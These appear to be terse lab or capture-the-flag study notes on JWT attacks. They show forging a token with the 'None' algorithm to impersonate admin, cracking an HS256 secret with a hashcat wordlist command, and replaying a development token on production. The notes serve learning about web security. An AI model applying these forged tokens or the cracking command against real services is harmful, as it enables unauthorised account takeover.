____

https://jwt.io/

# Bypassing signature checks

![[Pasted image 20241216131947.png]]
```json
{"typ":"JWT","alg":"None"}
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0=

```json
{"username":"admin"}
```
eyJ1c2VybmFtZSI6ImFkbWluIn0=

the same
ODnAXt9IXHDcP17XNR1yqHedzpifSsIejjDujNyiyRI

![[Pasted image 20241216132847.png]]

# Crackable key

```jwt
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.TXSbnEmdp-kgdKfOflVsbifEd8AYZn0JEnAIBqG0QQY
```

```bash
hashcat -m 16500 -a 0 jwt.txt /usr/share/seclists/rockyou.txt
```

![[Pasted image 20241216133932.png]]
# Reuse of JWT

![[Pasted image 20241216134846.png]]

## Development website

Register on development, 

```jwt
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo1fQ.02sSqhnYgMKCUlETC8VyLyrNOiY-oSYn4kmFvE0aylA
```

## Production website

Use the same JWT of development website, 

![[Pasted image 20241216134956.png]]

